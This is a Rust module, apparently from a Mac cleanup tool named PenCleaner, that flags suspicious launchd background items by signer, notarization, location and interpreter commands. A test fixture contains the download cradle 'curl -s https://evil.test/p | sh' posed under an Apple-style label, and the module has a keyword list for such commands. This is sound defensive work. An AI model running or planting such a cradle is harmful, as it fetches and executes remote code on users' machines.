//! Suspicious background items: how most Mac adware and malware survives a restart.
//! Each login/background item's program is checked for who signed it, whether Apple
//! notarized it, where it lives, and what it runs.

use crate::performance::items::{self, LaunchItem};
use rayon::prelude::*;
use serde::Serialize;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

#[derive(Debug, Clone, Copy, Serialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "camelCase")]
pub enum Severity {
    High,
    Medium,
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase", tag = "kind")]
pub enum Signer {
    Apple,
    /// `notarized` is None when the (online) check was switched off in Settings.
    Developer { name: String, team: String, notarized: Option<bool> },
    Homebrew,
    AdHoc,
    Unsigned,
    Script,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Finding {
    pub item: LaunchItem,
    /// The program actually run (for `sh script.sh`, the script).
    pub program: String,
    pub signer: Signer,
    pub severity: Severity,
    pub reasons: Vec<String>,
}

const INTERPRETERS: &[&str] = &["sh", "bash", "zsh", "dash", "python", "python3", "perl", "ruby", "osascript", "node"];

/// Reads `codesign -dv` and, when `online`, asks Apple whether developer-signed code is
/// notarized (the same lookup Gatekeeper does).
pub fn signer(path: &Path, online: bool) -> Signer {
    if is_homebrew(path) {
        return Signer::Homebrew;
    }
    let out = Command::new("/usr/bin/codesign").args(["-dv", "--verbose=2"]).arg(path).output();
    let text = out.map(|o| String::from_utf8_lossy(&o.stderr).into_owned()).unwrap_or_default();
    if text.contains("not signed at all") {
        let script = fs::read(path).map(|b| b.starts_with(b"#!")).unwrap_or(false);
        return if script { Signer::Script } else { Signer::Unsigned };
    }
    if text.contains("Signature=adhoc") {
        return Signer::AdHoc;
    }
    let field = |k: &str| text.lines().find_map(|l| l.strip_prefix(k)).map(|v| v.trim().to_owned());
    // Only macOS's own platform binaries carry a platform identifier.
    if field("Platform identifier=").is_some() {
        return Signer::Apple;
    }
    let authority = field("Authority=").unwrap_or_default();
    let team = field("TeamIdentifier=").filter(|t| t != "not set").unwrap_or_default();
    if authority == "Apple Mac OS Application Signing" {
        // Mac App Store: reviewed and signed by Apple on the developer's behalf.
        return Signer::Developer { name: "Mac App Store".into(), team, notarized: Some(true) };
    }
    let name = authority.strip_prefix("Developer ID Application: ").unwrap_or(&authority);
    let name = name.rsplit_once(" (").map_or(name, |(n, _)| n).to_owned();
    if !online {
        return Signer::Developer { name, team, notarized: None };
    }
    // Gatekeeper's own test, valid for helpers and tools too (spctl only judges apps).
    let notarized = Command::new("/usr/bin/codesign")
        .args(["--verify", "--check-notarization", "-R=notarized"])
        .arg(path)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|s| s.success());
    Signer::Developer { name, team, notarized: Some(notarized) }
}

fn is_homebrew(path: &Path) -> bool {
    let real = fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
    ["/usr/local/Cellar", "/usr/local/opt", "/usr/local/Caskroom", "/opt/homebrew"].iter().any(|p| real.starts_with(p))
}

/// Hidden folders, temp and shared folders: places installers have no reason to use.
fn odd_location(path: &Path) -> Option<&'static str> {
    let s = path.to_string_lossy();
    if ["/tmp/", "/private/tmp/", "/private/var/tmp/", "/var/folders/"].iter().any(|t| s.starts_with(t)) {
        return Some("Runs from a temporary folder");
    }
    if s.starts_with("/Users/Shared/") {
        return Some("Runs from the Shared folder");
    }
    let hidden = path
        .components()
        .filter_map(|c| c.as_os_str().to_str())
        .any(|c| c.starts_with('.') && c.len() > 1 && c != ".." && !matches!(c, ".local" | ".cargo" | ".bun" | ".nvm" | ".volta" | ".deno" | ".npm"));
    hidden.then_some("Runs from a hidden folder")
}

/// What the plist really launches: the program plus its arguments.
fn program_arguments(plist: &Path) -> Vec<String> {
    let Ok(v) = plist::Value::from_file(plist) else { return vec![] };
    let Some(d) = v.as_dictionary() else { return vec![] };
    let mut args: Vec<String> = d
        .get("ProgramArguments")
        .and_then(|a| a.as_array())
        .map(|a| a.iter().filter_map(|x| x.as_string().map(str::to_owned)).collect())
        .unwrap_or_default();
    if let Some(p) = d.get("Program").and_then(|p| p.as_string()) {
        if args.first().map(String::as_str) != Some(p) {
            args.insert(0, p.to_owned());
        }
    }
    args
}

/// PenCleaner's own login agent (Open at Login), bundled in the app.
pub const LOGIN_LABEL: &str = "com.pen.cleaner.login";

/// PenCleaner's own background items (the watcher, Open at Login): our label *and* the very
/// binary doing this scan, so a copycat using our label with any other program is still checked.
pub fn is_ours(item: &LaunchItem) -> bool {
    let same = |a: &Path, b: &Path| fs::canonicalize(a).ok().zip(fs::canonicalize(b).ok()).is_some_and(|(x, y)| x == y);
    (item.id == super::watch::LABEL || item.id == LOGIN_LABEL)
        && item.executable.as_deref().zip(std::env::current_exe().ok()).is_some_and(|(e, me)| same(Path::new(e), &me))
}

pub fn analyze(item: &LaunchItem, online: bool) -> Option<Finding> {
    let args = item.plist.as_deref().map(|p| program_arguments(Path::new(p))).unwrap_or_default();
    let exe = args.first().cloned().or_else(|| item.executable.clone())?;
    let exe_path = PathBuf::from(&exe);
    if !exe_path.is_absolute() || !exe_path.exists() {
        return None; // Broken items are Performance's business.
    }

    // `sh /path/script` and friends: judge the script, not the shell.
    let base = exe_path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    let mut program = exe_path.clone();
    let mut reasons = Vec::new();
    let mut severity = None;
    let mut flag = |sev: Severity, why: String, reasons: &mut Vec<String>| {
        severity = Some(severity.map_or(sev, |s: Severity| s.min(sev)));
        reasons.push(why);
    };
    if INTERPRETERS.contains(&base.as_str()) {
        let rest = args.iter().skip(1).cloned().collect::<Vec<_>>().join(" ");
        if let Some(script) = args.iter().skip(1).find(|a| a.starts_with('/') && Path::new(a).is_file()) {
            program = PathBuf::from(script);
        } else if ["curl ", "wget ", "base64", "| sh", "|sh", "eval "].iter().any(|t| rest.contains(t)) {
            flag(Severity::High, "Downloads or decodes code each time it runs".into(), &mut reasons);
        } else if !rest.is_empty() {
            flag(Severity::Medium, format!("Runs a {base} command directly"), &mut reasons);
        }
    }

    let signer = signer(&program, online);
    if item.id.starts_with("com.apple.") && signer != Signer::Apple {
        flag(Severity::High, "Uses an Apple name but isn't signed by Apple".into(), &mut reasons);
    }
    if let Some(why) = odd_location(&program) {
        flag(Severity::High, why.into(), &mut reasons);
    }
    match &signer {
        Signer::Unsigned => flag(Severity::Medium, "Its program isn't signed by any developer".into(), &mut reasons),
        Signer::AdHoc => flag(Severity::Medium, "Its program is only self-signed (no identified developer)".into(), &mut reasons),
        Signer::Developer { notarized: Some(false), name, .. } => flag(Severity::Medium, format!("Signed by {name} but not notarized by Apple"), &mut reasons),
        _ => {}
    }

    severity.map(|severity| Finding { item: item.clone(), program: program.to_string_lossy().into_owned(), signer, severity, reasons })
}

/// Reads launchd plists directly: fast and dependable (sfltool can hang for minutes),
/// and plists are what installers and malware plant.
pub fn scan(online: bool) -> Vec<Finding> {
    let none = std::collections::HashSet::new();
    let mut found: Vec<Finding> = items::from_plists(&none, &none).par_iter().filter(|i| !is_ours(i)).filter_map(|i| analyze(i, online)).collect();
    found.sort_by_key(|f| (f.severity, f.item.name.to_lowercase()));
    found
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn trusts_only_our_own_watcher_binary() {
        let me = std::env::current_exe().unwrap().to_string_lossy().into_owned();
        let mk = |id: &str, exe: &str| LaunchItem {
            id: id.into(),
            name: "x".into(),
            developer: None,
            kind: items::ItemKind::Agent,
            controllable: true,
            enabled: true,
            running: false,
            plist: None,
            executable: Some(exe.into()),
            app_path: None,
            app_name: None,
            broken: false,
            is_self: false,
        };
        assert!(is_ours(&mk(super::super::watch::LABEL, &me)));
        assert!(is_ours(&mk(LOGIN_LABEL, &me)), "Open at Login");
        assert!(!is_ours(&mk(LOGIN_LABEL, "/tmp/impostor")), "copycat login label");
        assert!(!is_ours(&mk(super::super::watch::LABEL, "/tmp/impostor")), "copycat label");
        assert!(!is_ours(&mk("com.other.agent", &me)));
    }

    #[test]
    fn spots_odd_places_but_not_toolchains() {
        assert_eq!(odd_location(Path::new("/private/tmp/x/agent")), Some("Runs from a temporary folder"));
        assert_eq!(odd_location(Path::new("/Users/me/Library/.hidden/updater")), Some("Runs from a hidden folder"));
        assert_eq!(odd_location(Path::new("/Users/me/.cargo/bin/tool")), None);
        assert_eq!(odd_location(Path::new("/Applications/Zoom.app/Contents/MacOS/zoom")), None);
    }

    #[test]
    fn reads_signers() {
        assert_eq!(signer(Path::new("/usr/bin/curl"), true), Signer::Apple);
        assert_eq!(signer(Path::new("/System/Applications/Calculator.app"), true), Signer::Apple);
        if Path::new("/Applications/Xcode.app").exists() {
            assert!(matches!(signer(Path::new("/Applications/Xcode.app"), true), Signer::Developer { notarized: Some(true), .. }));
        }
        let dir = tempfile::tempdir().unwrap();
        let s = dir.path().join("x.sh");
        fs::write(&s, "#!/bin/sh\n").unwrap();
        assert_eq!(signer(&s, true), Signer::Script);
    }

    #[test]
    fn flags_apple_impersonation_and_download_cradles() {
        let dir = tempfile::tempdir().unwrap();
        let plist = dir.path().join("com.apple.update.helper.plist");
        let mut d = plist::Dictionary::new();
        d.insert("Label".into(), "com.apple.update.helper".into());
        d.insert(
            "ProgramArguments".into(),
            plist::Value::Array(vec!["/bin/sh".into(), "-c".into(), "curl -s https://evil.test/p | sh".into()]),
        );
        plist::Value::Dictionary(d).to_file_xml(&plist).unwrap();
        let item = LaunchItem {
            id: "com.apple.update.helper".into(),
            name: "update".into(),
            developer: None,
            kind: items::ItemKind::Agent,
            controllable: true,
            enabled: true,
            running: false,
            plist: Some(plist.to_string_lossy().into_owned()),
            executable: Some("/bin/sh".into()),
            app_path: None,
            app_name: None,
            broken: false,
            is_self: false,
        };
        let f = analyze(&item, true).expect("flagged");
        assert_eq!(f.severity, Severity::High);
        assert!(f.reasons.iter().any(|r| r.contains("Downloads or decodes")), "{:?}", f.reasons);

        // A script posing under an Apple label: the script isn't Apple-signed.
        let script = dir.path().join("helper.sh");
        fs::write(&script, "#!/bin/sh\necho\n").unwrap();
        let mut d = plist::Dictionary::new();
        d.insert("ProgramArguments".into(), plist::Value::Array(vec!["/bin/sh".into(), script.to_string_lossy().into_owned().into()]));
        plist::Value::Dictionary(d).to_file_xml(&plist).unwrap();
        let f = analyze(&item, true).expect("flagged");
        assert!(f.reasons.iter().any(|r| r.contains("Apple name")), "{:?}", f.reasons);
        assert_eq!(f.program, script.to_string_lossy());
    }
}
